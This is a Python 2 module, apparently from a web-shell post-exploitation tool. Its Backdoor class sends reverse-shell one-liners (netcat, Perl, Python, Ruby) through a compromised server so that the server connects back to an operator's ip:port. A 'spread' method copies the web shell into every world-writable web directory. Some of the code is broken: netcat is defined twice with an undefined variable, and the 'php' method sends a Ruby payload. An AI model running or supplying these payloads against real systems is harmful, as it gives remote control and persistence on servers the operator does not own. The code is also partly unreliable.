from core.libs.menu import Colors
from core.libs.request_handler import make_request
from core.modules.shell_handler import linux
from subprocess import Popen, PIPE


class Backdoor(object):
    def list(self):
        # Source: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet (Thanks @pentestmonkey)
        print '\n[i] Usage: backdoor [module] <*ip:port>'
        print '[i] Modules:'
        #print '[i] \t*bash\t\tUse bash to create a reverse shell (not all versions support this!)'
        #print '[i] \t*java\t\tUse java to create a reverse shell'
        #print '[i] \t*msf\t\tUse a PHP metereter to create a reverse shell'
        print '[i] \t*netcat\t\tUse netcat traditional to create a reverse shell (not netcat openbsd)'
        print '[i] \t*perl\t\tUse perl to create a reverse shell'
        #print '[i] \t*php\t\tUse php-cli to create a reverse shell'
        print '[i] \t*python\t\tUse python to create a reverse shell'
        print '[i] \t*ruby\t\tUse ruby to create a reverse shell'
        print '[i] \tspread\t\tSpread our shell around'
        #print '[i] \t*xterm\t\tUse xterm to create a reverse shell'


    def netcat(self, ip, port):
        print '{0}\n[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN,ip, port, Colors.END)
        cmd = '{0} {1} {2} -e /bin/bash'.format(path, ip, port)
        self.check = make_request.get_page_source(cmd)
        print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)


    def msf(self, ip, port):
        import platform
        os = platform.platform()
        if "windows" in os.lower():
            print '{0}\n[!] Coming later (Windows) {1}'.format(Colors.RED, Colors.END)
        else:
            if len(Popen("for x in `whereis msfcli`; do file $x | grep executable; done", shell=True, stdout=PIPE).stdout.read().strip()) == 0:
                print '{0}\n[!] Wasn\'t able to detect the metasploit framework{1}'.format(Colors.RED, Colors.END)
            else:
                print '{0}\n[!] Coming later {1}'.format(Colors.RED, Colors.END)


    def netcat(self, ip, port):
        cmd = "for x in `whereis nc netcat`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        self.netcat = make_request.get_page_source(cmd)
        if self.netcat:
            print '{0}\n[i] Found Netcat!\n[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN,ip, port, Colors.END)
            c = 1
            for path in self.netcat:
                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                c += 1
                cmd = '{0} {1} {2} -e /bin/bash'.format(path, ip, port)
                self.check = make_request.get_page_source(cmd)
            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
        else:
            print '\n{0}[!]Didn\'t find netcat on the remote system{1}'.format(Colors.RED, Colors.END)


    def perl(self, ip, port):
        cmd = "for x in `whereis perl`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        self.perl = make_request.get_page_source(cmd)
        if self.perl:
            print '{0}\n[i] Found perl!\n[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN,ip, port, Colors.END)
            c = 1
            for path in self.perl:
                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                c += 1
                cmd = path+' -e \'use Socket;$i="'+ip+'";$p='+port+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''   # DOESN'T USE FORMAT *** !!!
                self.check = make_request.get_page_source(cmd)
            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
        else:
            print '\n{0}[!]Didn\'t find perl on the remote system{1}'.format(Colors.RED, Colors.END)


    def php(self, ip, port):
        cmd = "for x in `whereis php`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        self.php = make_request.get_page_source(cmd)
        if self.php:
            print '{0}\n[i] Found php-cli!\n[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN,ip, port, Colors.END)
            c = 1
            for path in self.php:
                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                c += 1
                cmd = '{0} -rsocket -e\'f=TCPSocket.open("{1}",{2}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''.format(path, ip, port)
                self.check = make_request.get_page_source(cmd)
            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
        else:
            print '\n{0}[!]Didn\'t find php-cli on the remote system{1}'.format(Colors.RED, Colors.END)


    def python(self, ip, port):
        cmd = "for x in `whereis python`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        self.python = make_request.get_page_source(cmd)
        if self.python:
            print '{0}\n[i] Found python!\n[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN,ip, port, Colors.END)
            c = 1
            for path in self.python:
                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                c += 1
                cmd = '{0} -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{1}",{2}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''.format(path, ip, port)
                self.check = make_request.get_page_source(cmd)
            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
        else:
            print '\n{0}[!]Didn\'t find python on the remote system{1}'.format(Colors.RED, Colors.END)


    def ruby(self, ip, port):
        cmd = "for x in `whereis ruby`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        self.ruby = make_request.get_page_source(cmd)
        if self.ruby:
            print '{0}\n[i] Found ruby!\n[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN,ip, port, Colors.END)
            c = 1
            for path in self.ruby:
                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                c += 1
                cmd = '{0} -rsocket -e\'f=TCPSocket.open("{1}",{2}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''.format(path, ip, port)
                self.check = make_request.get_page_source(cmd)
            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
        else:
            print '\n{0}[!]Didn\'t find ruby on the remote system{1}'.format(Colors.RED, Colors.END)



    # A method to spread the shell in all writable directories
    def spread(self):
        provided_shell_name = raw_input('\n{0}[!] Current shell name{1}: '.format(Colors.RED, Colors.END))
        shell_name = getargs.url.split('/')[-1] if getargs.method == 'post' else provided_shell_name
        cmd = 'find {0} -depth -perm -0002 -type d | xargs -n 1 cp -v {1}'.format(linux.get_doc_root(), shell_name)
        done = make_request.get_page_source(cmd)
        if done:
            success = '\n[+] {hot}{shell_name}{end} already written to {hot}{writable_length}{end} paths'.format(
                    shell_name=shell_name,
                    writable_length=len(done),
                    hot=Colors.HOT,
                    end=Colors.END,)
            success += '\n[+] To check these paths type {0}writable{1}'.format(Colors.HOT, Colors.END)
            print success
        else:
            print '[!] Something went wrong while spreading shell'


    def xterm(self, ip):
        cmd = "for x in `whereis xterm`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        self.xterm = make_request.get_page_source(cmd)
        if self.xterm:
            print '{0}\n[i] Found xterm!\n[i] Make sure \'{1}\' has a listener shell (Run: \'Xnest :1\') ALREADY setup on port: \'{2}\' & Don\'t forget to whitelist (Run: xhost +{1}){4}'.format(Colors.GREEN, ip, "6001", Colors.END)
            c = 1
            for path in self.xterm:
                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                c += 1
                cmd = '{0} xterm -display {1}:1'.format(path, ip)
                self.check = make_request.get_page_source(cmd)
            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
        else:
            print '\n{0}[!]Didn\'t find xterm on the remote system{1}'.format(Colors.RED, Colors.END)
backdoor = Backdoor()
